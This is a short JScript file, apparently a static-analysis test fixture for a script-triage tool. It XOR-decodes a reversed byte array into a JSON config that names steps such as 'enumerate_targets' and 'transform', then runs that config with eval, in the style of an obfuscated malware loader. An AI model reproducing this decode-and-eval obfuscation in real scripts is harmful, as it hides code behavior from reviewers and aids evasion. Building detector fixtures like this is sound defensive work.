// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_d9fa5f47 = function decode_d9fa5f47_body(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ 190); }
  return recoveredMaterial;
};
var recover_9759cbf1 = function recover_9759cbf1_body() {
  var storedMaterial = [195,141,132,156,202,208,203,209,253,219,217,223,202,205,156,146,195,156,202,198,202,144,220,135,138,142,139,216,143,136,220,220,147,236,251,232,241,253,251,236,156,132,156,219,211,223,208,225,219,202,209,208,156,146,156,220,135,138,142,139,216,143,136,220,220,147,218,219,213,221,209,210,144,156,132,156,208,209,215,205,208,219,202,198,219,156,146,156,220,135,138,142,139,216,143,136,220,220,147,202,221,223,206,211,215,226,226,220,223,242,205,205,219,204,202,208,203,246,226,226,221,215,210,220,203,238,226,226,205,204,219,205,235,226,226,132,253,156,132,156,202,209,209,204,225,202,219,217,204,223,202,156,146,156,220,135,138,142,139,216,143,136,220,220,147,208,217,215,223,206,211,223,221,156,132,156,218,215,225,208,217,215,223,206,211,223,221,156,197,132,156,205,219,203,210,223,200,156,146,156,211,223,219,204,202,237,144,252,250,241,250,255,156,132,156,204,219,202,206,223,218,223,156,146,227,156,219,202,209,208,225,199,204,219,200,209,221,219,204,225,219,202,215,204,201,156,146,156,202,208,219,202,208,209,221,225,211,204,209,216,205,208,223,204,202,156,146,156,205,202,219,217,204,223,202,225,219,202,223,204,219,211,203,208,219,156,229,132,156,205,206,219,202,205,156,197];

  storedMaterial.reverse();

  var harmlessValue = "PROCESSOR_ARCHITECTURE";

  var invoke = function(block, value) { return block.call(null, value); };

  var recoveredMaterial = invoke.call(null, decode_d9fa5f47, storedMaterial);

  var configurationText = recoveredMaterial.length ? String.fromCharCode(recoveredMaterial[0]) : "";

  for (var bi = 1; bi < recoveredMaterial.length; bi++) { configurationText = configurationText.concat(String.fromCharCode(recoveredMaterial[bi])); }

  return configurationText;
};
var inspect_f62f1e6a = function inspect_f62f1e6a_body() {
  var configuration = eval("(" + recover_9759cbf1.call(null) + ")");
  return { steps: configuration.steps, adapter: configuration["adapter"], values: configuration.values, stageCount: configuration["stageCount"] };
};
